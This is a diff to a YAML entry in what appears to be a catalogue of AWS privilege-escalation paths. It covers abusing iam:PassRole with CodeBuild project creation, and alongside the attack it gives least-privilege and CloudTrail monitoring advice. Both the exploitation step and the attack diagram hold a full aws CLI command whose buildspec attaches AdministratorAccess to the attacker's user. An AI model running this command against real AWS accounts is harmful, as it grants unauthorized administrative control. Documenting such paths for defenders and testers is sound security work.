@@ -26,13 +26,7 @@ exploitationSteps:
     description: Discover roles that trust codebuild.amazonaws.com (optional but helpful
       for finding privileged roles to pass)
   - step: 2
-    command: "aws codebuild create-project --name privesc-project \\\n  --source type=NO_SOURCE,buildspec=\"\
-      version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - echo \\\"Starting\
-      \ privilege escalation...\\\"\\n      - aws iam attach-user-policy --user-name\
-      \ YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\\n\
-      \      - echo \\\"Successfully attached AdministratorAccess!\\\"\" \\\n  --artifacts\
-      \ type=NO_ARTIFACTS \\\n  --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL\
-      \ \\\n  --service-role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\n"
+    command: "aws codebuild create-project --name privesc-project --source \"{\\\"type\\\":\\\"NO_SOURCE\\\",\\\"buildspec\\\":\\\"version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - echo \\\\\\\"Starting privilege escalation...\\\\\\\"\\n      - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\\n      - echo \\\\\\\"Successfully attached AdministratorAccess!\\\\\\\"\\\"}\" --artifacts type=NO_ARTIFACTS --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL --service-role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE"
     description: Create a CodeBuild project with the privileged role and malicious
       buildspec that attaches AdministratorAccess to your user
   - step: 3
@@ -51,23 +45,33 @@ limitations: 'This path provides administrative access only if the passed role h
   However, even limited access may enable multi-hop attacks.
 
   '
-recommendation: "High powered service roles + overly permissive `iam:PassRole` is\
-  \ what makes this privilege escalation path exploitable and impactful.\n\n- **Avoid\
-  \ administrative service roles** - Very rarely does a CodeBuild project need administrative\
-  \ access. Use the principle of least privilege.\n- **Avoid granting `iam:PassRole`\
-  \ on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles\
-  \ or specific services.\n\nUse IAM policy conditions to restrict which roles can\
-  \ be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"\
-  Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificCodeBuildRole\"\
-  ,\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"\
-  codebuild.amazonaws.com\"\n    }\n  }\n}\n```\n\n- Monitor CloudTrail for unusual\
-  \ CodeBuild project creation followed by immediate build execution\n- Monitor CloudTrail\
-  \ for CodeBuild project creation by principals who do not usually create projects\n\
-  - Monitor CloudTrail for roles being passed to CodeBuild that haven't been used\
-  \ before\n- Monitor and alert on CodeBuild project creation with privileged roles\n\
-  - Regularly audit CodeBuild projects for excessive IAM permissions\n- Regularly\
-  \ audit all IAM roles that trust the CodeBuild service and down-scope any roles\
-  \ with administrative access\n"
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative service roles** - Very rarely does a CodeBuild project need administrative access. Use the principle of least privilege.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.
+
+  Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificCodeBuildRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "codebuild.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  - Monitor CloudTrail for unusual CodeBuild project creation followed by immediate build execution
+  - Monitor CloudTrail for CodeBuild project creation by principals who do not usually create projects
+  - Monitor CloudTrail for roles being passed to CodeBuild that haven't been used before
+  - Monitor and alert on CodeBuild project creation with privileged roles
+  - Regularly audit CodeBuild projects for excessive IAM permissions
+  - Regularly audit all IAM roles that trust the CodeBuild service and down-scope any roles with administrative access
 discoveryAttribution:
   firstDocumented:
     author: Erik Steringer
@@ -195,16 +199,15 @@ attackVisualization:
   - from: start
     to: codebuild_project
     label: iam:PassRole + codebuild:CreateProject
-    description: "The attacker creates a new CodeBuild project and passes a privileged\
-      \ role to it. The project is created with a malicious inline buildspec that\
-      \ will execute commands to escalate privileges.\n\nCommand:\n```bash\naws codebuild\
-      \ create-project --name privesc-project \\\n  --source type=NO_SOURCE,buildspec=\"\
-      version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - aws iam attach-user-policy\
-      \ --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"\
-      \ \\\n  --artifacts type=NO_ARTIFACTS \\\n  --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL\
-      \ \\\n  --service-role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\n```\n\n\
-      The buildspec contains commands to attach AdministratorAccess to the starting\
-      \ principal or perform other privileged actions.\n"
+    description: |
+      The attacker creates a new CodeBuild project and passes a privileged role to it. The project is created with a malicious inline buildspec that will execute commands to escalate privileges.
+
+      Command:
+      ```bash
+      aws codebuild create-project --name privesc-project --source "{\"type\":\"NO_SOURCE\",\"buildspec\":\"version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - echo \\\"Starting privilege escalation...\\\"\\n      - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\\n      - echo \\\"Successfully attached AdministratorAccess!\\\"\"}" --artifacts type=NO_ARTIFACTS --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL --service-role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE
+      ```
+
+      The buildspec contains commands to attach AdministratorAccess to the starting principal or perform other privileged actions.
   - from: codebuild_project
     to: target_role
     label: Project assumes role
